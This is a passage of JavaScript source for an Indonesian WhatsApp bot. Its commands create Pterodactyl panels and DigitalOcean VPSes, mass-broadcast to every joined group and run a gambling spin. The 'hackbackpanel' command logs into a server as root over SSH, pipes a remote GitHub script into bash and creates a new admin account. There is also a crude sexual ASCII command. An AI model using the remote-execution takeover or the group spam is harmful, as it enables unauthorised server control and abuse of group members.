│ 📌 *Action:* t.me/OwnerDnzXZ
│ 🛠 *Version:* 4.0
│ ⏳ *Time:* ${tanggal(Date.now())}
╰───────────────────╯

╭───❍ *𝐈𝐍𝐅𝐎 𝐔𝐒𝐄𝐑* ❍───╮
│ 👤 *Nama:* ${m.pushName}
│ ⭐ *Status:* ${isCreator ? "Developer" : isPremium ? "Premium" : "User"}
│ 📞 *Nomor:* @${m.sender.split("@")[0]})
╰───────────────────╯
`;

    let buttons = [
        {
            buttonId: ".allmenu",
            buttonText: { displayText: "📜 All Menu" },
            type: 1
        }
    ];

    let buttonMessage = {
        image: profileImage,
        caption: profileText,
        mentions: [m.sender],
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                newsletterName: "Simple Bot V4"
            }
        },
        footer: "⚜️ 𝐒𝐢𝐦𝐩𝐥𝐞 𝐁𝐨𝐭 𝐕𝟒",
        buttons: buttons,
        viewOnce: true,
        headerType: 4
    };

    await conn.sendMessage(m.chat, buttonMessage, { quoted: qtext });
};
break;

case 'cekprofilegb': {
    if (!m.isGroup) return m.reply("❌ Fitur ini hanya bisa digunakan dalam grup!");

    let groupMetadata = await conn.groupMetadata(m.chat);
    let participants = groupMetadata.participants;
    let senderData = participants.find(p => p.id === m.sender);

    const profileImage = fs.readFileSync(`./source/image/prof.jpg`);
    let profileText = `
╭───❍ *𝐏𝐑𝐎𝐅𝐈𝐋𝐄 𝐆𝐑𝐎𝐔𝐏* ❍───╮
│ 📌 *Group:* ${groupMetadata.subject}
│ 👥 *Total Anggota:* ${participants.length}
│ ⏳ *Waktu:* ${tanggal(Date.now())}
╰───────────────────╯

╭───❍ *𝐏𝐑𝐎𝐅𝐈𝐋𝐄 𝐀𝐍𝐃𝐀* ❍───╮
│ 👤 *Nama:* ${m.pushName}
│ 🎭 *Status:* ${senderData.admin ? "Admin" : "Member"}
│ 📞 *Nomor:* @${m.sender.split("@")[0]})
╰───────────────────╯
`;

    let buttons = [
        {
            buttonId: ".allmenu",
            buttonText: { displayText: "📜 All Menu" },
            type: 1
        }
    ];

    let buttonMessage = {
        image: profileImage,
        caption: profileText,
        mentions: [m.sender],
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                newsletterName: "Simple Bot V4"
            }
        },
        footer: "⚜️ 𝐒𝐢𝐦𝐩𝐥𝐞 𝐁𝐨𝐭 𝐕𝟒",
        buttons: buttons,
        viewOnce: true,
        headerType: 4
    };

    await conn.sendMessage(m.chat, buttonMessage, { quoted: qtext });
};
break;

case "spin": case "judilite": {
// Animasi Spin
const kontol = [spin, spin2, spin3, spin4, spin5, spin6, spin7, spin8, spin9, spin10];
let randomIndex = Math.floor(Math.random() * kontol.length)
let hasil = kontol[randomIndex]

// TEKS
let hadiahText = `
╭─ 𝖧𝖺𝖽𝗂𝖺𝗁 𝖲𝗉𝗂𝗇 🎰 ─╮
│Time : ${tanggal(Date.now())}
│Nama : ${m.pushName}
│Nomor : ${m.sender.split("@")[0]}
╰────────────╯

Hadiah : ${pool}
`;
await conn.sendMessage(m.chat, {text: hasil + hadiahText}, {quoted: m})
}
break

case "claimhadiah3": {
global.panel = crypto.randomBytes(4).toString('hex')
var ram
var disknya
var cpu
if (command == "claimhadiah2") {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Spesifikasi Server*
* Ram : *${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}*
* Disk : *${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu+"%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await fs.writeFileSync("akunpanel.txt", teks)
await conn.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
delete global.panel
}
break

case "claimhadiah5": {
global.panel = crypto.randomBytes(4).toString('hex')
var ram
var disknya
var cpu
if (command == "claimhadiah5") {
ram = "8000"
disknya = "4000"
cpu = "180"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Spesifikasi Server*
* Ram : *${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}*
* Disk : *${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu+"%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await fs.writeFileSync("akunpanel.txt", teks)
await conn.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
delete global.panel
}
break

case "claimhadiah1": {
global.panel = crypto.randomBytes(4).toString('hex')
var ram
var disknya
var cpu
if (command == "claimhadiah1") {
ram = "5000"
disknya = "3000"
cpu = "120"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Spesifikasi Server*
* Ram : *${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}*
* Disk : *${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu+"%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await fs.writeFileSync("akunpanel.txt", teks)
await conn.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
delete global.panel
}
break

case "jpm4": {
    if (!isCreator) return Reply(mess.owner);
    if (!q) return m.reply(example("*teks dengan mengirim audio*"));
    if (!/audio/.test(mime)) return m.reply(example("teks dengan mengirim audio"));
    
    const allgrup = await conn.groupFetchAllParticipating();
    const res = await Object.keys(allgrup);
    let count = 0;
    const teks = text;
    const jid = m.chat;
    const rest = await conn.downloadAndSaveMediaMessage(qmsg);
    
    await m.reply(`*Memproses Jpm audio ke ${res.length} grup*`);
    
    for (let i of res) {
        // Lewati grup yang ada dalam daftar blacklist
        if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue;
        try {
            // Kirim audio dengan caption
            await conn.sendMessage(i, { audio: fs.readFileSync(rest), mimetype: 'audio/mpeg', ptt: true }, { quoted: qlocJpm });
            count += 1;
        } catch {}
        await sleep(global.delayJpm); // Beri jeda pengiriman antar grup
    }
    
    await fs.unlinkSync(rest); // Hapus file sementara setelah selesai
    await conn.sendMessage(jid, { text: `*Jpm Audio Sukses dikirim*\n*Total grup yang berhasil dikirim pesan : ${count}*` }, { quoted: m });
}
break;

case "sendtesti": case "jpmtesti": {
if (!isCreator) return Reply(global.mess.owner)
if (!text) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await conn.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await conn.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses pengiriman *testimoni* ke dalam channel & ${res.length} grup chat`)
await conn.sendMessage(global.idSaluran, {image: await fs.readFileSync(rest), caption: teks})
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, {image: await fs.readFileSync(rest), caption: teks, contextInfo: { isForwarded: true, mentionedJid: [m.sender], businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: global.namaSaluran, newsletterJid: global.idSaluran }}}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await conn.sendMessage(jid, {text: `Berhasil mengirim *testimoni* ke dalam channel & ${count} grup chat`}, {quoted: m})
}
break

case "cvps": {
if (!isCreator && !ispremium) return Reply(global.mess.owner);
  if (!text) return m.reply(example("hostname"));

  let teksHeader = `
╭───────────✦───────────╮
     *乂 List Ram Vps Yang Tersedia*
╰───────────✦───────────╯`;

  let buttons = [
    {
      buttonId: "action",
      buttonText: { displayText: "Pesan RAM Anda" },
      type: 4,
      nativeFlowInfo: {
        name: "single_select",
        paramsJson: JSON.stringify({
          title: "",
          sections: [
            {
              title: "UBUNTU 20.04",
              rows: [
                { title: "Ram 1 & Cpu 1", description: "© Wannhosting", id: `.cvps1g1c1 ${text}` },
                { title: "Ram 2 & Cpu 1", description: "© Wannhosting", id: `.cvps2g1c1 ${text}` },
                { title: "Ram 2 & Cpu 2", description: "© Wannhosting", id: `.cvps2g2c1 ${text}` },
                { title: "Ram 4 & Cpu 2", description: "© Wannhosting", id: `.cvps4g2c1 ${text}` },
                { title: "Ram 8 & Cpu 2", description: "© Wannhosting", id: `.cvps8g2c1 ${text}` },
                { title: "Ram 8 & Cpu 4", description: "© Wannhosting", id: `.cvps8g4c1 ${text}` },
                { title: "Ram 16 & Cpu 4", description: "© Wannhosting", id: `.cvps16g4c1 ${text}` },
                ]}, {
                title: "UBUNTU 22.04",
                rows: [
                { title: "Ram 1 & Cpu 1", description: "© Wannhosting", id: `.cvps1g1c2 ${text}` },
                { title: "Ram 2 & Cpu 1", description: "© Wannhosting", id: `.cvps2g1c2 ${text}` },
                { title: "Ram 2 & Cpu 2", description: "© Wannhosting", id: `.cvps2g2c2 ${text}` },
                { title: "Ram 4 & Cpu 2", description: "© Wannhosting", id: `.cvps4g2c2 ${text}` },
                { title: "Ram 8 & Cpu 2", description: "© Wannhosting", id: `.cvps8g2c2 ${text}` },
                { title: "Ram 8 & Cpu 4", description: "© Wannhosting", id: `.cvps8g4c2 ${text}` },
                { title: "Ram 16 & Cpu 4", description: "© Wannhosting", id: `.cvps16g4c2 ${text}` },
                ]}, {
                title: "UBUNTU 24.04",
                rows: [
                { title: "Ram 1 & Cpu 1", description: "© Wannhosting", id: `.cvps1g1c3 ${text}` },
                { title: "Ram 2 & Cpu 1", description: "© Wannhosting", id: `.cvps2g1c3 ${text}` },
                { title: "Ram 2 & Cpu 2", description: "© Wannhosting", id: `.cvps2g2c3 ${text}` },
                { title: "Ram 4 & Cpu 2", description: "© Wannhosting", id: `.cvps4g2c3 ${text}` },
                { title: "Ram 8 & Cpu 2", description: "© Wannhosting", id: `.cvps8g2c3 ${text}` },
                { title: "Ram 8 & Cpu 4", description: "© Wannhosting", id: `.cvps8g4c3 ${text}` },
                { title: "Ram 16 & Cpu 4", description: "© Wannhosting", id: `.cvps16g4c2 ${text}` },
              ],
            },
          ],
        }),
      },
    },
  ];

  conn.sendMessage(
    m.chat,
    {
      text: teksHeader,
      footer: "© Copyright Simple Bot V4",
      buttons,
      headerType: 1,
      viewOnce: true,
    },
    { quoted: m }
  );
};
break;

case 'listdroplet': {
if (!isCreator) return Reply(mess.owner)
try {
const getDroplets = async () => {
try {
const response = await fetch('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: "Bearer " + global.apiDigitalOcean
}
});
const data = await response.json();
return data.droplets || [];
} catch (err) {
m.reply('Error fetching droplets: ' + err);
return [];
}
};

getDroplets().then(droplets => {
let totalvps = droplets.length;
let mesej = `List droplet digital ocean kamu: ${totalvps}\n\n`;

if (droplets.length === 0) {
mesej += 'Tidak ada droplet yang tersedia!';
} else {
droplets.forEach(droplet => {
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
mesej += `Droplet ID: ${droplet.id}
Hostname: ${droplet.name}
Username: Root
IP: ${ipAddress}
Ram: ${droplet.memory} MB
Cpu: ${droplet.vcpus} CPU
OS: ${droplet.image.distribution}
Storage: ${droplet.disk} GB
Status: ${droplet.status}\n`;
});
}
Sky.sendMessage(m.chat, { text: mesej }, {quoted: qtext});
});
} catch (err) {
m.reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
}
}
break

//================================================================================

case 'restartvps': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
const restartVPS = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

const response = await fetch(apiUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'reboot'
})
});

if (response.ok) {
const data = await response.json();
return data.action;
} else {
const errorData = await response.json();
m.reply(`Gagal melakukan restart VPS: ${errorData.message}`);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan restart VPS: ' + err);
}
};

restartVPS(dropletId)
.then((action) => {
m.reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
})
.catch((err) => {
m.reply(err);
})

}
break

//================================================================================

case 'rebuild': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text 
let rebuildVPS = async () => {
try {
// Rebuild droplet menggunakan API DigitalOcean
const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'rebuild',
image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
})
});

if (response.ok) {
const data = await response.json();
m.reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);
const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});
if (vpsInfo.ok) {
const vpsData = await vpsInfo.json();
const droplet = vpsData.droplet;
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';

const textvps = `*VPS BERHASIL DI REBUILD*
IP VPS: ${ipAddress}
SYSTEM IMAGE: ${droplet.image.slug}`;
await sleep(60000) 
conn.sendMessage(m.chat, { text: textvps }, {quoted: qtext});
} else {
m.reply('Gagal mendapatkan informasi VPS setelah rebuild!');
}
} else {
const errorData = await response.json();
m.reply('Gagal melakukan rebuild VPS : ' + errorData.message);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan rebuild VPS : ' + err);
}};
rebuildVPS();
}
break

case 'staff': {
    if (!m.isGroup) return m.reply("❌ Fitur ini hanya bisa digunakan dalam grup!");
    
    let groupMetadata = await conn.groupMetadata(m.chat);
    let participants = groupMetadata.participants;
    
    let admins = participants.filter(p => p.admin); // Ambil hanya admin grup
    
    if (admins.length === 0) return m.reply("⚠️ Tidak ada admin di grup ini.");

    let adminList = "*👮 List Security*\n";
    let mentions = [];
    
    admins.forEach((admin, index) => {
        let name = groupMetadata.participants.find(p => p.id === admin.id)?.subject || "Tidak diketahui";
        adminList += `${index + 1}. @${admin.id.split("@")[0]}\n`;
        mentions.push(admin.id);
    });

    await conn.sendMessage(m.chat, { text: adminList, mentions: mentions }, { quoted: m });
};
break;

case "sisadroplet": {
if (!isCreator) return Reply(mess.owner)
async function getDropletInfo() {
try {
const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

if (accountResponse.status === 200 && dropletsResponse.status === 200) {
const dropletLimit = accountResponse.data.account.droplet_limit;
const dropletsCount = dropletsResponse.data.droplets.length;
const remainingDroplets = dropletLimit - dropletsCount;

return {
dropletLimit,
remainingDroplets,
totalDroplets: dropletsCount,
};
} else {
return new Error('Gagal mendapatkan data akun digital ocean atau droplet!');
}
} catch (err) {
return err;
}}
async function sisadropletHandler() {
try {
if (!isCreator) return Reply(mess.owner)

const dropletInfo = await getDropletInfo();
m.reply(`Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}

Total droplet terpakai: ${dropletInfo.totalDroplets}`);
} catch (err) {
reply(`Terjadi kesalahan: ${err}`);
}}
sisadropletHandler();
}
break

//================================================================================

case "deldroplet": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
let deleteDroplet = async () => {
try {
let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'DELETE',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});

if (response.ok) {
m.reply('Droplet berhasil dihapus!');
} else {
const errorData = await response.json();
return new Error(`Gagal menghapus droplet: ${errorData.message}`);
}
} catch (error) {
console.error('Terjadi kesalahan saat menghapus droplet:', error);
m.reply('Terjadi kesalahan saat menghapus droplet.');
}};
deleteDroplet();
}
break

case "kntl": case "kontol": {
      var loadingz = [
        "1",
        "2",
        "3",
        "DOR",
        `

⣠⡶⠚⠛⠲⢄⡀
⣼⠁ ⠀⠀⠀ ⠳⢤⣄
⢿⠀⢧⡀⠀⠀⠀⠀⠀⢈⡇
 ⠳⣼⡙⠒⠶⠶⠖⠚⠉⠳⣄
⠀⠀⠈⣇⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄
⠀⠀⠘⣆ ⠀⠀⠀⠀ ⠀    ⠈⠓⢦⣀
⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠲⢤
⠀⠀⠀⠀⠀⠀⠙⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧
⠀⠀⠀⠀⠀⠀⠀⡴⠋⠓⠦⣤⡀⠀⠀⠀⠀⠀⠀⠀⠈⣇
⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡄
⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇
⠀⠀⠀⠀⠀⠀⢹⡄⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃
⠀⠀⠀⠀⠀⠀⠀⠙⢦⣀⣳⡀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠏
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⢦⣀⣀⣀⣀⣠⡴⠚⠉

`,
      ];
      let { key } = await conn.sendMessage(m.chat, {
        text: "mau pap kontol ? wet",
      });

      for (let i = 0; i < loadingz.length; i++) {
        await sleep(400);
        await conn.sendMessage(m.chat, { text: loadingz[i], edit: key });
      }
    }
break

case "instagram": case "igdl": case "ig": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await fetchJson(`https://restapi-v2.simplebot.my.id/download/instagram?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
if (res.result.downloadUrls.length > 1) {
for (let i of res.result.downloadUrls) {
await conn.sendMessage(m.chat, {image: {url: i}, caption: "*Instagram Downloader ✅*"}, {quoted: m})
}
} else {
await conn.sendMessage(m.chat, {video: {url: res.result.downloadUrls[0]}, mimetype: "video/mp4", caption: "*Instagram Downloader ✅*"}, {quoted: m})
}
}).catch((e) => m.reply("Error"))
}
break

case "hbpanel": case "hackbackpanel": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 2) return m.reply(example("ipvps|pwvps"))

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom("")
const newpw = "admin" + getRandom("")

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: m})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "cvps1g1c1": {
if (!isCreator) return Reply(mess.owner)
let hostname = args[0];
if (!hostname) return Reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-1gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword()
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + global.apiDigitalOcean
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      Reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + global.apiDigitalOcean
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

let teksnya = `*Berikut Data Vps Kamu 🌐*

*Id Vps :* ${dropletId}
*Ip Vps :* ${ipVPS}
*Pw Vps :* ${password}`
await conn.sendMessage(m.chat, {text: teksnya}, {quoted: m})
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.error(err);
Reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

//================================================================================

case "cvps2g1c1": {
if (!isCreator) return Reply(mess.owner)
let hostname = args[0];
if (!hostname) return Reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword()
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
